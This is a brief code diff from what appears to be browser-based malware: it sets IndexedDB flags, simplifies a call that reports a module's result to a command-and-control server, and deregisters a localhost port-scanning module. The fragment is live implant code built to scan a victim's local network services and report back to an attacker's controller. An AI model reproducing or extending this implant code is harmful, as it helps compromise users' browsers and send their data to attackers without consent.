@@ -6,8 +6,6 @@ WriteIDB("sync3", 0);
 WriteIDB("extra_modules", JSON.stringify({}));
 WriteIDB("localhost_port_scan", 1);
 
-data = new FormData();
-data.append('result', `done`)
-sendModuleResultToC2('clear_sw_indexedDB', data);
+sendModuleResultToC2('clear_sw_indexedDB', `done`);
 
 deregisterModule('localhost_port_scan');
